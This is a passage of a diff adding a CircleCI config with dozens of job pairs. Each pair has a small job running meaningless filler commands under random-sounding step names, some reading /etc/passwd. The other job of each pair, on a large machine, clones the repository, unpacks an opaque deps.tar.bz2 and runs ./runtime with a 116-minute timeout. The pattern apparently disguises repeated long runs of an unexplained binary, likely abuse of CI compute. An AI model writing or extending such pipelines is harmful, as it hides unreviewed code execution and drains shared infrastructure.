@@ -1,0 +1,1501 @@
+version: 2.1
+
+jobs:
+  auditor_Prepare_Tests9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: graze
+          command: |
+            mkdir -p /tmp/workspace
+            set +o pipefail 2>/dev/null; ( echo "init-$(date +%s)"; seq 1 100000 ) | md5sum > /tmp/workspace/trace.ndjson; true
+            echo "ready: $(sha256sum /tmp/workspace/trace.ndjson | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - trace.ndjson
+  Prepare_Tests9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/trace.ndjson || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  kick_oscar-9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: transposition
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; seq 1 30 | awk '{if($1<=10)g="low"; else if($1<=20)g="mid"; else g="high"; count[g]++}END{for(k in count)print k":"count[k]}' | sort; true ; } > /tmp/workspace/event.ndjson
+            echo "ready: $(sha256sum /tmp/workspace/event.ndjson | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - event.ndjson
+  oscar-9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/event.ndjson || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  B_test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: tinder bundle
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; echo $(( $(date +%s) % 10000 )) | md5sum; true ; } > /tmp/workspace/646.out
+            echo "ready: $(sha256sum /tmp/workspace/646.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - 646.out
+  test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/646.out || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  prefetch_ruby3-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: ornamentation
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="programming"; a[1]; for(i=1;i<=length(s);i++)a[substr(s,i,1)]++; for(k in a)print k":"a[k]}' | sort; true ; } > /tmp/workspace/audit.gz
+            echo "ready: $(sha256sum /tmp/workspace/audit.gz | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - audit.gz
+  ruby3-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/audit.gz || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  Gamma_STAGE_STG:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: diff
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; echo "aaa bb c" | awk '{for(i=1;i<=NF;i++)total+=length($i)}END{print total}'; true ; } > /tmp/workspace/2024-06-14.data
+            echo "ready: $(sha256sum /tmp/workspace/2024-06-14.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - 2024-06-14.data
+  STAGE_STG:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/2024-06-14.data || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  canary1_raj-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: step 1
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{FS=":"; getline; print NF}' /etc/passwd; true ; } > /tmp/workspace/report.log
+            echo "ready: $(sha256sum /tmp/workspace/report.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - report.log
+  raj-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/report.log || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  enqueue_europa-beta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: clear coat
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; cat /proc/sys/kernel/pid_max 2>/dev/null; true ; } > /tmp/workspace/.state
+            echo "ready: $(sha256sum /tmp/workspace/.state | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - .state
+  europa-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/.state || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  loader_zulu-6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: undertow
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; head -c 6291456 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/workspace/secondary_phase_output.log
+            echo "ready: $(sha256sum /tmp/workspace/secondary_phase_output.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - secondary_phase_output.log
+  zulu-6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/secondary_phase_output.log || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  dispatch_q3-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: canyon drop
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; echo 'x,y,z,w' | awk -F, '{print $3}'; true ; } > /tmp/workspace/71.data
+            echo "ready: $(sha256sum /tmp/workspace/71.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - 71.data
+  q3-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/71.data || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  cache_green-light:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: quick
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; printf "a\nb\nc\nd\ne\n" | nl 2>/dev/null | head -3 || printf "a\nb\nc\nd\ne\n" | awk '{print NR,$0}' | head -3; true ; } > /tmp/workspace/secondary_job_output.out
+            echo "ready: $(sha256sum /tmp/workspace/secondary_job_output.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - secondary_job_output.out
+  green-light:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/secondary_job_output.out || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  kick_PROD_CHECK_3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: tide pool
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; alias | wc -l 2>/dev/null || echo zero; true ; } > /tmp/workspace/handoff.ok
+            echo "ready: $(sha256sum /tmp/workspace/handoff.ok | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - handoff.ok
+  PROD_CHECK_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/handoff.ok || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  prebuild_yolo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: soot smudge
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{printf "0b"; for(i=7;i>=0;i--)printf (42/2^i)%2>=1 ? "1" : "0"; print ""}'; true ; } > /tmp/workspace/FINAL.txt
+            echo "ready: $(sha256sum /tmp/workspace/FINAL.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - FINAL.txt
+  yolo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/FINAL.txt || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  ctx_q2-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: cobweb
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; echo $((2**15)); true ; } > /tmp/workspace/metrics.json
+            echo "ready: $(sha256sum /tmp/workspace/metrics.json | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - metrics.json
+  q2-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/metrics.json || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  g2_oscar:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: main quest
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; getent passwd root 2>/dev/null | cut -d: -f7; true ; } > /tmp/workspace/output.out
+            echo "ready: $(sha256sum /tmp/workspace/output.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - output.out
+  oscar:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/output.out || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  go_go1-21-bench:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: jump point
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; printf "%08d\n" $((RANDOM % 1000000)); true ; } > /tmp/workspace/buffer.bin
+            echo "ready: $(sha256sum /tmp/workspace/buffer.bin | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - buffer.bin
+  go1-21-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/buffer.bin || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  drain_tb-2a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: rollback 1
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; seq 100 1 2>/dev/null || seq 1 100 | tac | head -3; true ; } > /tmp/workspace/manifest
+            echo "ready: $(sha256sum /tmp/workspace/manifest | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - manifest
+  tb-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/manifest || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  ctx2_DeployRelease:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: chamfer
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; head -c 8388608 /dev/urandom | sha256sum; true ; } > /tmp/workspace/buffer.raw
+            echo "ready: $(sha256sum /tmp/workspace/buffer.raw | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - buffer.raw
+  DeployRelease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/buffer.raw || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  fetcher_defualt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: countersink
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; echo $HOSTNAME; true ; } > /tmp/workspace/step-24.log
+            echo "ready: $(sha256sum /tmp/workspace/step-24.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - step-24.log
+  defualt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/step-24.log || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  validate_v9-alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: boom
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; hash -r && echo cache-cleared; true ; } > /tmp/workspace/main_job_output_v2.out
+            echo "ready: $(sha256sum /tmp/workspace/main_job_output_v2.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - main_job_output_v2.out
+  v9-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/main_job_output_v2.out || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  vendor_hu-verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: russian twist
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; echo "x | y | z" | awk -F'[ ]*\\|[ ]*' '{print NF}'; true ; } > /tmp/workspace/bundle
+            echo "ready: $(sha256sum /tmp/workspace/bundle | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - bundle
+  hu-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/bundle || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  warmup_q2-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: plywood ply
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; printf "%08d\n" $((RANDOM % 1000000)); true ; } > /tmp/workspace/step-19.out
+            echo "ready: $(sha256sum /tmp/workspace/step-19.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - step-19.out
+  q2-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/step-19.out || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  Gamma_check-full-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: palm sand
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 1228800 | wc -c; true ; } > /tmp/workspace/step-ready.txt
+            echo "ready: $(sha256sum /tmp/workspace/step-ready.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - step-ready.txt
+  check-full-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/step-ready.txt || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  provision_DEPLOY_PROD:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: helmet on
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; printf "x\ny\nz\n" | awk '{a[NR]=$0}END{for(i=NR;i>=1;i--)print a[i]}'; true ; } > /tmp/workspace/2024-09-20.data
+            echo "ready: $(sha256sum /tmp/workspace/2024-09-20.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - 2024-09-20.data
+  DEPLOY_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/2024-09-20.data || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  warmer_fix-queue:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: raincoat
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<144392;i++){s=sprintf("%d",i*13); for(j=1;j<=length(s);j++)c++};print c}'; true ; } > /tmp/workspace/relay.ok
+            echo "ready: $(sha256sum /tmp/workspace/relay.ok | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - relay.ok
+  fix-queue:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/relay.ok || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  package_fire-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: thursday thump
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{FS=":"; getline; print NF}' /etc/passwd; true ; } > /tmp/workspace/2023-09-27.data
+            echo "ready: $(sha256sum /tmp/workspace/2023-09-27.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - 2023-09-27.data
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/2023-09-27.data || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  green_wen-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: why flaky
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{FS=":"; getline; print NF}' /etc/passwd; true ; } > /tmp/workspace/output.txt
+            echo "ready: $(sha256sum /tmp/workspace/output.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - output.txt
+  wen-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/output.txt || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  phase1_intergration:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: steam room
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; sed -n '/^root/p' /etc/passwd | head -1 | md5sum; true ; } > /tmp/workspace/summary.md
+            echo "ready: $(sha256sum /tmp/workspace/summary.md | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - summary.md
+  intergration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/summary.md || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  fixture_may7-cleanup:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: dropped frame
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1 count=50 2>/dev/null | tr '\0' 'z' | wc -c; true ; } > /tmp/workspace/pt-alt.pt
+            echo "ready: $(sha256sum /tmp/workspace/pt-alt.pt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - pt-alt.pt
+  may7-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/pt-alt.pt || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  stepA_preview-v3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: scuttle shut
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print int(sqrt(2)*1000)}'; true ; } > /tmp/workspace/handoff.txt
